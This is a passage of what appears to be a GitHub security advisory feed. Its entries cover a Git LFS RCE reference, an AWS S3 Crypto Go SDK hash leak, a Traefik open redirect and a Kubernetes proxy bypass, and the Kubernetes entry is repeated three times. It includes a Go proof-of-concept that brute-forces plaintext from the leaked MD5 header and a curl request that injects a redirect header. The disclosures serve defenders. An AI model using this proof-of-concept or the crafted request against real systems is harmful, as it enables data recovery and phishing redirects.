<li><a href="https://legalhackers.com/advisories/Git-LFS-RCE-Exploit-CVE-2020-27955.html">https://legalhackers.com/advisories/Git-LFS-RCE-Exploit-CVE-2020-27955.html</a></li>
<li><a href="http://seclists.org/fulldisclosure/2020/Nov/1">http://seclists.org/fulldisclosure/2020/Nov/1</a></li>
<li><a href="https://github.com/advisories/GHSA-4g4p-42wc-9f3m">https://github.com/advisories/GHSA-4g4p-42wc-9f3m</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-4g4p-42wc-9f3m</uri>
        </author>
        <published>2022-02-11T23:39:18.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/aws/aws-sdk-go/service/s3/s3crypto] Unencrypted md5 plaintext hash in metadata in AWS S3 Crypto SDK for golang]]></title>
        <id>https://github.com/advisories/GHSA-76wf-9vgp-pj7w</id>
        <link href="https://github.com/advisories/GHSA-76wf-9vgp-pj7w"/>
        <updated>2022-02-11T23:26:42.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>The golang AWS S3 Crypto SDK was impacted by an issue that can result in loss of confidentiality. An attacker with read access to an encrypted S3 bucket was able to recover the plaintext without accessing the encryption key.</p>
<h3 id="riskseverity">Risk/Severity</h3>
<p>The vulnerability poses insider risks/privilege escalation risks, circumventing KMS controls for stored data.</p>
<h3 id="impact">Impact</h3>
<p>The issue has been fully mitigated by AWS as of Aug. 5th by disallowing the header in question.</p>
<p>The S3 crypto library tries to store an unencrypted hash of the plaintext alongside the ciphertext as a metadata field. This hash can be used to brute force the plaintext in an offline attack, if the hash is readable to the attacker. In order to be impacted by this issue, the attacker has to be able to guess the plaintext as a whole. The attack is theoretically valid if the plaintext entropy is below the key size, i.e. if it is easier to brute force the plaintext instead of the key itself, but practically feasible only for short plaintexts or plaintexts otherwise accessible to the attacker in order to create a rainbow table.</p>
<p>The issue has been fixed server-side by AWS as of Aug 5th, by blocking the related metadata field. No S3 objects are affected anymore.</p>
<h3 id="mitigation">Mitigation</h3>
<p>The header in question is no longer served by AWS, making this attack fully mitigated as of Aug. 5th.</p>
<h3 id="proof-of-concept">Proof of concept</h3>
<p>A <a href="https://github.com/sophieschmieg/exploits/tree/master/aws_s3_crypto_poc">Proof of concept</a> is available in a separate github repository, this particular issue can be found at <a href="https://github.com/sophieschmieg/exploits/blob/master/aws_s3_crypto_poc/exploit/hash_exploit.go">here</a>:</p>
<pre><code class="language-golang">func HashExploit(bucket string, key string, input *OfflineAttackInput) (string, error) {
    _, header, err := input.S3Mock.GetObjectDirect(bucket, key)
    length, err := strconv.Atoi(header.Get("X-Amz-Meta-X-Amz-Unencrypted-Content-Length"))
    plaintextMd5 := header.Get("X-Amz-Meta-X-Amz-Unencrypted-Content-Md5")
    blocks := length / 16
    possiblePlaintextNum := 1
    segNum := len(input.PossiblePlaintextSegments)
    for i := 0; i &lt; blocks; i++ {
        possiblePlaintextNum *= segNum
    }
    for i := 0; i &lt; possiblePlaintextNum; i++ {
        w := i
        guess := ""
        for j := 0; j &lt; blocks; j++ {
            guess += input.PossiblePlaintextSegments[w%segNum]
            w /= segNum
        }
        guessMd5 := md5.Sum([]byte(guess))
        if plaintextMd5 == base64.StdEncoding.EncodeToString(guessMd5[:]) {
            return guess, nil
        }
    }
    return "", fmt.Errorf("No plaintext found!")
}
</code></pre>
<p>The PoC will only work on old versions of the library, as the hash has been removed from being calculated as well.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/google/security-research/security/advisories/GHSA-76wf-9vgp-pj7w">https://github.com/google/security-research/security/advisories/GHSA-76wf-9vgp-pj7w</a></li>
<li><a href="https://github.com/advisories/GHSA-76wf-9vgp-pj7w">https://github.com/advisories/GHSA-76wf-9vgp-pj7w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-76wf-9vgp-pj7w</uri>
        </author>
        <published>2022-02-11T23:26:12.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/containous/traefik/api/v2] Open redirect in Traefik]]></title>
        <id>https://github.com/advisories/GHSA-6qq8-5wq3-86rp</id>
        <link href="https://github.com/advisories/GHSA-6qq8-5wq3-86rp"/>
        <updated>2022-02-11T23:19:37.000Z</updated>
        <content type="html"><![CDATA[<h2 id="summary">Summary</h2>
<p>There exists a potential open redirect vulnerability in Traefik's handling of the <code>X-Forwarded-Prefix</code> header. Active Exploitation of this issue is unlikely as it would require active header injection, however the Traefik team addressed this issue nonetheless to prevent abuse in e.g. cache poisoning scenarios.</p>
<h2 id="details">Details</h2>
<p>The Traefik API dashboard component doesn't validate that the value of the header <code>X-Forwarded-Prefix</code> is a site relative path and will redirect to any header provided URI.</p>
<p>e.g.</p>
<pre><code>$ curl --header 'Host:traefik.localhost' --header 'X-Forwarded-Prefix:https://example.org' 'http://localhost:8081'
&lt;a href="https://example.org/dashboard/"&gt;Found&lt;/a&gt;.`
</code></pre>
<h3 id="impact">Impact</h3>
<p>A successful exploitation of an open redirect can be used to entice victims to disclose sensitive information.</p>
<h3 id="workarounds">Workarounds</h3>
<p>By using the <code>headers</code> middleware, the request header <code>X-Forwarded-Prefix</code> value can be overridden by the value <code>.</code> (dot)</p>
<ul>
<li><a href="https://docs.traefik.io/v2.2/middlewares/headers/#customrequestheaders">https://docs.traefik.io/v2.2/middlewares/headers/#customrequestheaders</a></li>
<li><a href="https://docs.traefik.io/v1.7/basics/#custom-headers">https://docs.traefik.io/v1.7/basics/#custom-headers</a></li>
</ul>
<h3 id="for-more-information">For more information</h3>
<p>If you have any questions or comments about this advisory, open an issue in <a href="https://github.com/containous/traefik/issues">Traefik</a>.</p>
<h2 id="credit">Credit</h2>
<p>This issue was found by the GitHub Application Security Team and reported on behalf of the GHAS by the GitHub Security Lab Team.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/containous/traefik/security/advisories/GHSA-6qq8-5wq3-86rp">https://github.com/containous/traefik/security/advisories/GHSA-6qq8-5wq3-86rp</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-15129">https://nvd.nist.gov/vuln/detail/CVE-2020-15129</a></li>
<li><a href="https://github.com/containous/traefik/pull/7109">https://github.com/containous/traefik/pull/7109</a></li>
<li><a href="https://github.com/containous/traefik/commit/cfa04c300c5db95ae8a52c31a9d973b6dd9c2254">https://github.com/containous/traefik/commit/cfa04c300c5db95ae8a52c31a9d973b6dd9c2254</a></li>
<li><a href="https://github.com/containous/traefik/commit/e63db782c11c7b8bfce30be4c902e7ef8f9f33d2">https://github.com/containous/traefik/commit/e63db782c11c7b8bfce30be4c902e7ef8f9f33d2</a></li>
<li><a href="https://github.com/containous/traefik/releases/tag/v1.7.26">https://github.com/containous/traefik/releases/tag/v1.7.26</a></li>
<li><a href="https://github.com/containous/traefik/releases/tag/v2.2.8">https://github.com/containous/traefik/releases/tag/v2.2.8</a></li>
<li><a href="https://github.com/containous/traefik/releases/tag/v2.3.0-rc3">https://github.com/containous/traefik/releases/tag/v2.3.0-rc3</a></li>
<li><a href="https://github.com/advisories/GHSA-6qq8-5wq3-86rp">https://github.com/advisories/GHSA-6qq8-5wq3-86rp</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6qq8-5wq3-86rp</uri>
        </author>
        <published>2022-02-11T23:19:21.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[k8s.io/kubernetes] Potential proxy IP restriction bypass in Kubernetes]]></title>
        <id>https://github.com/advisories/GHSA-qh36-44jv-c8xj</id>
        <link href="https://github.com/advisories/GHSA-qh36-44jv-c8xj"/>
        <updated>2022-02-11T23:01:00.000Z</updated>
        <content type="html"><![CDATA[<p>As mitigations to a report from 2019 and CVE-2020-8555, Kubernetes attempts to prevent proxied connections from accessing link-local or localhost networks when making user-driven connections to Services, Pods, Nodes, or StorageClass service providers. As part of this mitigation Kubernetes does a DNS name resolution check and validates that response IPs are not in the link-local (169.254.0.0/16) or localhost (127.0.0.0/8) range. Kubernetes then performs a second DNS resolution without validation for the actual connection. If a non-standard DNS server returns different non-cached responses, a user may be able to bypass the proxy IP restriction and access private networks on the control plane.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-8562">https://nvd.nist.gov/vuln/detail/CVE-2020-8562</a></li>
<li><a href="https://github.com/kubernetes/kubernetes/issues/101493">https://github.com/kubernetes/kubernetes/issues/101493</a></li>
<li><a href="https://groups.google.com/g/kubernetes-security-announce/c/-MFX60_wdOY">https://groups.google.com/g/kubernetes-security-announce/c/-MFX60_wdOY</a></li>
<li><a href="https://github.com/advisories/GHSA-qh36-44jv-c8xj">https://github.com/advisories/GHSA-qh36-44jv-c8xj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qh36-44jv-c8xj</uri>
        </author>
        <published>2022-02-02T00:01:58.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[k8s.io/kubernetes] Potential proxy IP restriction bypass in Kubernetes]]></title>
        <id>https://github.com/advisories/GHSA-qh36-44jv-c8xj</id>
        <link href="https://github.com/advisories/GHSA-qh36-44jv-c8xj"/>
        <updated>2022-02-11T23:01:00.000Z</updated>
        <content type="html"><![CDATA[<p>As mitigations to a report from 2019 and CVE-2020-8555, Kubernetes attempts to prevent proxied connections from accessing link-local or localhost networks when making user-driven connections to Services, Pods, Nodes, or StorageClass service providers. As part of this mitigation Kubernetes does a DNS name resolution check and validates that response IPs are not in the link-local (169.254.0.0/16) or localhost (127.0.0.0/8) range. Kubernetes then performs a second DNS resolution without validation for the actual connection. If a non-standard DNS server returns different non-cached responses, a user may be able to bypass the proxy IP restriction and access private networks on the control plane.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-8562">https://nvd.nist.gov/vuln/detail/CVE-2020-8562</a></li>
<li><a href="https://github.com/kubernetes/kubernetes/issues/101493">https://github.com/kubernetes/kubernetes/issues/101493</a></li>
<li><a href="https://groups.google.com/g/kubernetes-security-announce/c/-MFX60_wdOY">https://groups.google.com/g/kubernetes-security-announce/c/-MFX60_wdOY</a></li>
<li><a href="https://github.com/advisories/GHSA-qh36-44jv-c8xj">https://github.com/advisories/GHSA-qh36-44jv-c8xj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qh36-44jv-c8xj</uri>
        </author>
        <published>2022-02-02T00:01:58.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[k8s.io/kubernetes] Potential proxy IP restriction bypass in Kubernetes]]></title>
        <id>https://github.com/advisories/GHSA-qh36-44jv-c8xj</id>
        <link href="https://github.com/advisories/GHSA-qh36-44jv-c8xj"/>
        <updated>2022-02-11T23:01:00.000Z</updated>
        <content type="html"><![CDATA[<p>As mitigations to a report from 2019 and CVE-2020-8555, Kubernetes attempts to prevent proxied connections from accessing link-local or localhost networks when making user-driven connections to Services, Pods, Nodes, or StorageClass service providers. As part of this mitigation Kubernetes does a DNS name resolution check and validates that response IPs are not in the link-local (169.254.0.0/16) or localhost (127.0.0.0/8) range. Kubernetes then performs a second DNS resolution without validation for the actual connection. If a non-standard DNS server returns different non-cached responses, a user may be able to bypass the proxy IP restriction and access private networks on the control plane.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-8562">https://nvd.nist.gov/vuln/detail/CVE-2020-8562</a></li>
<li><a href="https://github.com/kubernetes/kubernetes/issues/101493">https://github.com/kubernetes/kubernetes/issues/101493</a></li>
<li><a href="https://groups.google.com/g/kubernetes-security-announce/c/-MFX60_wdOY">https://groups.google.com/g/kubernetes-security-announce/c/-MFX60_wdOY</a></li>
<li><a href="https://github.com/advisories/GHSA-qh36-44jv-c8xj">https://github.com/advisories/GHSA-qh36-44jv-c8xj</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-qh36-44jv-c8xj</uri>
        </author>
        <published>2022-02-02T00:01:58.000Z</published>
    </entry>
</feed>